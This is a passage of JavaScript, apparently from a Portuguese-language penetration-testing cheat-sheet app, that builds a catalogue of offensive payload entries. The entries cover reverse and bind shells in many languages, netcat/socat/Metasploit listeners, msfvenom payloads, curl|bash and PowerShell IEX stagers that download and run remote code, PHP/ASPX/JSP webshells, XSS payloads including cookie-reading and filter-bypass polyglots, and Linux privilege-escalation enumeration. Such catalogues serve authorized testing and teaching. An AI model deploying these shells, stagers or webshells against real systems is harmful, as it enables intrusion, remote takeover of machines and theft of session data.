    if (item.description !== undefined) c.description = Lstr(item.description, lang);
    if (item.context !== undefined) c.context = Lstr(item.context, lang);
    return c;
  });
}

// --- Catalogo completo para pesquisa ---
function getAllPayloads(ip, port, file, domain, user, dc, pivnet, pivhost, lang) {
  domain = domain || "LAB.local";
  user = user || "Administrator";
  dc = dc || ip;
  pivnet = pivnet || "10.10.20.0/24";
  pivhost = pivhost || "10.10.20.10";
  return localizeList([
    {
      id: "rev-shell",
      title: "Reverse Shell",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Reverse Shell.",
      code: revSh(ip, port),
      showUrl: true,
      keywords: "reverse shell sh general linux rev netcat bash tcp"
    },
    {
      id: "rev-bash",
      title: "Reverse Shell - Bash",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Bash.",
      code: revBash(ip, port),
      showUrl: true,
      keywords: "reverse shell bash linux rev tcp dev one-liner"
    },
    {
      id: "rev-python",
      title: "Reverse Shell - Python",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Python.",
      code: revPython(ip, port),
      showUrl: true,
      keywords: "reverse shell python python3 rev socket pty"
    },
    {
      id: "rev-php",
      title: "Reverse Shell - PHP",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando PHP.",
      code: revPhp(ip, port),
      showUrl: true,
      keywords: "reverse shell php rev web fsockopen exec"
    },
    {
      id: "rev-nc",
      title: "Reverse Shell - Netcat",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Netcat.",
      code: revNcMkfifo(ip, port),
      showUrl: true,
      keywords: "reverse shell netcat nc mkfifo fifo rev"
    },
    {
      id: "rev-nc-e",
      title: "Reverse Shell - Netcat -e",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Netcat -e.",
      code: revNcE(ip, port),
      showUrl: true,
      keywords: "reverse shell netcat nc -e bin bash rev"
    },
    {
      id: "rev-ps",
      title: "Reverse Shell - PowerShell",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando PowerShell.",
      code: revPowershell(ip, port),
      showUrl: true,
      keywords: "reverse shell powershell ps windows rev tcpclient"
    },
    {
      id: "rev-ruby",
      title: "Reverse Shell - Ruby",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Ruby.",
      code: revRuby(ip, port),
      showUrl: true,
      keywords: "reverse shell ruby rev tcpsocket socket"
    },
    {
      id: "rev-perl",
      title: "Reverse Shell - Perl",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Perl.",
      code: revPerl(ip, port),
      showUrl: true,
      keywords: "reverse shell perl rev socket"
    },
    {
      id: "rev-node",
      title: "Reverse Shell - Node.js",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Node.js.",
      code: revNode(ip, port),
      showUrl: true,
      keywords: "reverse shell nodejs node rev socket child_process"
    },
    {
      id: "rev-socat",
      title: "Reverse Shell - Socat",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Socat.",
      code: revSocat(ip, port),
      showUrl: true,
      keywords: "reverse shell socat rev pty tcp"
    },
    {
      id: "rev-socat-ssl",
      title: "Reverse Shell - Socat SSL",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Socat SSL.",
      code: revSocatSSL(ip, port),
      showUrl: true,
      keywords: "reverse shell socat ssl openssl encrypted rev"
    },
    {
      id: "rev-openssl",
      title: "Reverse Shell - OpenSSL",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando OpenSSL.",
      code: revOpenssl(ip, port),
      showUrl: true,
      keywords: "reverse shell openssl s_client encrypted tls rev"
    },
    {
      id: "rev-awk",
      title: "Reverse Shell - Awk",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Awk.",
      code: revAwk(ip, port),
      showUrl: true,
      keywords: "reverse shell awk gawk rev inet tcp"
    },
    {
      id: "rev-telnet",
      title: "Reverse Shell - Telnet + fifo",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Telnet + fifo.",
      code: revTelnet(ip, port),
      showUrl: true,
      keywords: "reverse shell telnet fifo mkfifo rev"
    },
    {
      id: "rev-busybox",
      title: "Reverse Shell - BusyBox nc",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando BusyBox nc.",
      code: revBusybox(ip, port),
      showUrl: true,
      keywords: "reverse shell busybox netcat nc embedded rev"
    },
    {
      id: "rev-ncat-ssl",
      title: "Reverse Shell - Ncat SSL",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Ncat SSL.",
      code: revNcatSSL(ip, port),
      showUrl: true,
      keywords: "reverse shell ncat ssl nmap encrypted rev"
    },
    {
      id: "rev-bash-b64",
      title: "Reverse Shell - Bash base64 wrapper",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Bash base64 wrapper.",
      code: revBashB64(ip, port),
      showUrl: true,
      keywords: "reverse shell bash base64 bypass filter waf rev encode"
    },
    {
      id: "rev-curl-pipe",
      title: "Reverse Shell - curl | bash stager",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando curl | bash stager.",
      code: revCurlPipe(ip, port),
      showUrl: true,
      keywords: "reverse shell curl pipe bash stager download rev"
    },
    {
      id: "rev-wget-pipe",
      title: "Reverse Shell - wget | bash stager",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando wget | bash stager.",
      code: revWgetPipe(ip, port),
      showUrl: true,
      keywords: "reverse shell wget pipe bash stager download rev"
    },
    {
      id: "rev-ps-iex",
      title: "Reverse Shell - PowerShell IEX remote",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando PowerShell IEX remote.",
      code: revPowershellIex(ip, port),
      showUrl: true,
      keywords: "reverse shell powershell iex downloadstring remote windows rev"
    },
    {
      id: "rev-ps-enc-hint",
      title: "Reverse Shell - PowerShell -EncodedCommand (formato)",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando PowerShell -EncodedCommand (formato).",
      code: revPowershellEncodedHint(),
      showUrl: false,
      keywords: "reverse shell powershell encodedcommand base64 utf16 bypass amsi windows"
    },
    {
      id: "bind-nc",
      title: "Bind Shell - Netcat",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Bind Shell - Netcat.",
      code: revBindNc(port),
      showUrl: false,
      keywords: "bind shell netcat nc listen connect rev"
    },
    {
      id: "bind-socat",
      title: "Bind Shell - Socat",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Bind Shell - Socat.",
      code: revBindSocat(port),
      showUrl: false,
      keywords: "bind shell socat listen pty rev"
    },
    {
      id: "bind-python",
      title: "Bind Shell - Python",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Bind Shell - Python.",
      code: revBindPython(port),
      showUrl: false,
      keywords: "bind shell python listen socket rev"
    },
    {
      id: "listener-nc",
      title: "Listener - Netcat",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Listener - Netcat.",
      code: listenerNc(port),
      showUrl: false,
      keywords: "listener netcat nc lvnp handler attacker rev"
    },
    {
      id: "listener-ncat",
      title: "Listener - Ncat",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Listener - Ncat.",
      code: listenerNcat(port),
      showUrl: false,
      keywords: "listener ncat nmap handler rev"
    },
    {
      id: "listener-ncat-ssl",
      title: "Listener - Ncat SSL",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Listener - Ncat SSL.",
      code: listenerNcatSSL(port),
      showUrl: false,
      keywords: "listener ncat ssl encrypted handler rev"
    },
    {
      id: "listener-socat",
      title: "Listener - Socat",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Listener - Socat.",
      code: listenerSocat(port),
      showUrl: false,
      keywords: "listener socat handler pty rev"
    },
    {
      id: "listener-socat-tty",
      title: "Listener - Socat full TTY",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Listener - Socat full TTY.",
      code: listenerSocatTTY(port),
      showUrl: false,
      keywords: "listener socat tty raw echo handler rev"
    },
    {
      id: "listener-msf",
      title: "Listener - Metasploit handler",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Listener - Metasploit handler.",
      code: listenerMsf(ip, port),
      showUrl: false,
      keywords: "listener metasploit msf handler meterpreter rev"
    },
    {
      id: "msfvenom-elf",
      title: "MSFVenom - Linux ELF reverse",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando MSFVenom - Linux ELF reverse.",
      code: msfvenomElf(ip, port),
      showUrl: false,
      keywords: "msfvenom elf linux reverse tcp payload generate"
    },
    {
      id: "msfvenom-php",
      title: "MSFVenom - PHP meterpreter",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando MSFVenom - PHP meterpreter.",
      code: msfvenomPhp(ip, port),
      showUrl: false,
      keywords: "msfvenom php meterpreter web payload"
    },
    {
      id: "msfvenom-aspx",
      title: "MSFVenom - ASPX meterpreter",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando MSFVenom - ASPX meterpreter.",
      code: msfvenomAspx(ip, port),
      showUrl: false,
      keywords: "msfvenom aspx windows iis meterpreter web"
    },
    {
      id: "msfvenom-ps1",
      title: "MSFVenom - PowerShell reverse",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando MSFVenom - PowerShell reverse.",
      code: msfvenomPs1(ip, port),
      showUrl: false,
      keywords: "msfvenom powershell ps1 windows reverse"
    },
    {
      id: "msfvenom-war",
      title: "MSFVenom - WAR JSP reverse",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando MSFVenom - WAR JSP reverse.",
      code: msfvenomWar(ip, port),
      showUrl: false,
      keywords: "msfvenom war jsp java tomcat reverse"
    },
    {
      id: "webshell-php-min",
      title: "Webshell - PHP minimo (?cmd=)",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Webshell - PHP minimo (?cmd=).",
      code: webshellPhpMin(),
      showUrl: true,
      keywords: "webshell php system get cmd web rce"
    },
    {
      id: "webshell-php-post",
      title: "Webshell - PHP via POST",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Webshell - PHP via POST.",
      code: webshellPhpPost(),
      showUrl: false,
      keywords: "webshell php post system web rce"
    },
    {
      id: "webshell-php-short",
      title: "Webshell - PHP curto shell_exec",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Webshell - PHP curto shell_exec.",
      code: webshellPhpShort(),
      showUrl: true,
      keywords: "webshell php short shell_exec web rce"
    },
    {
      id: "webshell-aspx-min",
      title: "Webshell - ASPX minimo (?cmd=)",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Webshell - ASPX minimo (?cmd=).",
      code: webshellAspxMin(),
      showUrl: true,
      keywords: "webshell aspx csharp windows iis web rce"
    },
    {
      id: "webshell-jsp-min",
      title: "Webshell - JSP minimo (?cmd=)",
      category: "rev",
      categoryLabel: "Reverse",
      icon: "\udb82\udfc4",
      subcat: "shell",
      context: "Conex\u00e3o Reversa TCP",
      purpose: "Acesso interativo remoto para testes autorizados",
      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Webshell - JSP minimo (?cmd=).",
      code: webshellJspMin(),
      showUrl: true,
      keywords: "webshell jsp java tomcat web rce"
    },
    {
      id: "xss-payloads",
      title: "XSS Payloads",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: "<script>alert(1)</script>",
      showUrl: true,
      keywords: "xss payloads script alert basic injection cross site scripting"
    },
    {
      id: "xss-payloads-img",
      title: "XSS Payloads - Image onerror",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: "<img src=x onerror=alert(1)>",
      showUrl: true,
      keywords: "xss payloads img image onerror alert"
    },
    {
      id: "xss-payloads-svg",
      title: "XSS Payloads - SVG onload",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: "<svg onload=alert(1)>",
      showUrl: true,
      keywords: "xss payloads svg onload alert"
    },
    {
      id: "xss-events",
      title: "XSS Event Handlers",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: "<input autofocus onfocus=alert(1)>",
      showUrl: true,
      keywords: "xss event handlers autofocus onfocus onerror onload onmouseover onclick"
    },
    {
      id: "xss-events-body",
      title: "XSS Event Handlers - Body onload",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: "<body onload=alert(document.cookie)>",
      showUrl: true,
      keywords: "xss event handlers body onload cookie steal session"
    },
    {
      id: "xss-encoders",
      title: "XSS Encoders",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
      showUrl: true,
      keywords: "xss encoders hex decimal html entity bypass filter encode"
    },
    {
      id: "xss-encoders-charcode",
      title: "XSS Encoders - fromCharCode",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: "<script>alert(String.fromCharCode(88,83,83))</script>",
      showUrl: true,
      keywords: "xss encoders string fromcharcode ascii bypass"
    },
    {
      id: "xss-polyglots",
      title: "XSS Polyglots",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/<titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
      showUrl: true,
      keywords: "xss polyglots polyglot universal filter bypass waf complex"
    },
    {
      id: "xss-polyglots-svg",
      title: "XSS Polyglots - SVG Breakout",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: "\"--><svg/onload=alert(1)>",
      showUrl: true,
      keywords: "xss polyglots svg breakout quote tag escape"
    },
    {
      id: "tty-python",
      title: "TTY - Python pty",
      category: "tty",
      categoryLabel: "TTY",
      icon: "\udb80\udd8d",
      subcat: "tty",
      context: "TTY / Terminal Stabilization",
      purpose: "Estabilizar terminal e habilitar controle de jobs",
      description: "Configura terminal virtual interativo para suporte a comandos como su e sudo.",
      code: ttyPython(),
      showUrl: false,
      keywords: "tty python pty spawn shell bash interactive"
    },
    {
      id: "tty-script",
      title: "TTY - Script",
      category: "tty",
      categoryLabel: "TTY",
      icon: "\udb80\udd8d",
      subcat: "tty",
      context: "TTY / Terminal Stabilization",
      purpose: "Estabilizar terminal e habilitar controle de jobs",
      description: "Configura terminal virtual interativo para suporte a comandos como su e sudo.",
      code: ttyScript(),
      showUrl: false,
      keywords: "tty script bin bash null upgrade"
    },
    {
      id: "tty-stty",
      title: "TTY - Stty raw + fg",
      category: "tty",
      categoryLabel: "TTY",
      icon: "\udb80\udd8d",
      subcat: "tty",
      context: "TTY / Terminal Stabilization",
      purpose: "Estabilizar terminal e habilitar controle de jobs",
      description: "Configura terminal virtual interativo para suporte a comandos como su e sudo.",
      code: ttyStty(),
      showUrl: false,
      keywords: "tty stty raw echo fg terminal size"
    },
    {
      id: "tty-socat",
      title: "TTY - Socat",
      category: "tty",
      categoryLabel: "TTY",
      icon: "\udb80\udd8d",
      subcat: "tty",
      context: "TTY / Terminal Stabilization",
      purpose: "Estabilizar terminal e habilitar controle de jobs",
      description: "Configura terminal virtual interativo para suporte a comandos como su e sudo.",
      code: ttySocat(ip, port),
      showUrl: false,
      keywords: "tty socat exec pty stderr setsid"
    },
    {
      id: "tty-export",
      title: "TTY - Export TERM",
      category: "tty",
      categoryLabel: "TTY",
      icon: "\udb80\udd8d",
      subcat: "tty",
      context: "TTY / Terminal Stabilization",
      purpose: "Estabilizar terminal e habilitar controle de jobs",
      description: "Configura terminal virtual interativo para suporte a comandos como su e sudo.",
      code: ttyExport(),
      showUrl: false,
      keywords: "tty export term xterm-256color terminal"
    },
    {
      id: "linux-suid-4000",
      title: "Linux - SUID /4000",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "suid",
      context: "Linux Privilege Escalation",
      purpose: "Auditar permiss\u00f5es e configura\u00e7\u00f5es locais",
      description: "Verifica permiss\u00f5es de arquivos e bin\u00e1rios para identificar vetores de eleva\u00e7\u00e3o de privil\u00e9gios.",
      code: "find / -user root -perm /4000 2>/dev/null",
      showUrl: false,
      keywords: "linux suid perm root privilege escalation privesc"
    },
    {
      id: "linux-suid-u=s",
      title: "Linux - SUID -u=s",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "suid",
      context: "Linux Privilege Escalation",
      purpose: "Auditar permiss\u00f5es e configura\u00e7\u00f5es locais",
      description: "Verifica permiss\u00f5es de arquivos e bin\u00e1rios para identificar vetores de eleva\u00e7\u00e3o de privil\u00e9gios.",
      code: "find / -perm -u=s -type f 2>/dev/null",
      showUrl: false,
      keywords: "linux suid perm file privesc"
    },
    {
      id: "linux-find-txt",
      title: "Linux - Find text files",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "general",
      context: "Linux Privilege Escalation",
      purpose: "Auditar permiss\u00f5es e configura\u00e7\u00f5es locais",
      description: "Verifica permiss\u00f5es de arquivos e bin\u00e1rios para identificar vetores de eleva\u00e7\u00e3o de privil\u00e9gios.",
      code: "find / -type f -name '*.txt' 2>/dev/null",
      showUrl: false,
      keywords: "linux find search txt credentials files password"
    },
    {
      id: "linux-getcap",
      title: "Linux - Capabilities",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "capabilities",
      context: "Linux Privilege Escalation",
      purpose: "Auditar permiss\u00f5es e configura\u00e7\u00f5es locais",
      description: "Verifica permiss\u00f5es de arquivos e bin\u00e1rios para identificar vetores de eleva\u00e7\u00e3o de privil\u00e9gios.",
      code: "getcap -r / 2>/dev/null",
      showUrl: false,
      keywords: "linux capabilities getcap privesc"
    },
    {
      id: "linux-uname",
      title: "Linux - Kernel & OS Release",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "general",
      context: "Linux Privilege Escalation",
      purpose: "Auditar permiss\u00f5es e configura\u00e7\u00f5es locais",
      description: "Verifica permiss\u00f5es de arquivos e bin\u00e1rios para identificar vetores de eleva\u00e7\u00e3o de privil\u00e9gios.",
      code: "uname -a; cat /etc/os-release",
      showUrl: false,
      keywords: "linux uname kernel os release systeminfo enum"
    },
    {
      id: "linux-sudo-id",
      title: "Linux - Sudo & id",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "general",
      context: "Linux Privilege Escalation",
      purpose: "Auditar permiss\u00f5es e configura\u00e7\u00f5es locais",
      description: "Verifica permiss\u00f5es de arquivos e bin\u00e1rios para identificar vetores de eleva\u00e7\u00e3o de privil\u00e9gios.",
      code: "id; sudo -l",
      showUrl: false,
      keywords: "linux sudo id whoami privileges"
    },
    {
      id: "win-systeminfo",
      title: "Windows - Systeminfo",
      category: "win",
      categoryLabel: "Windows",
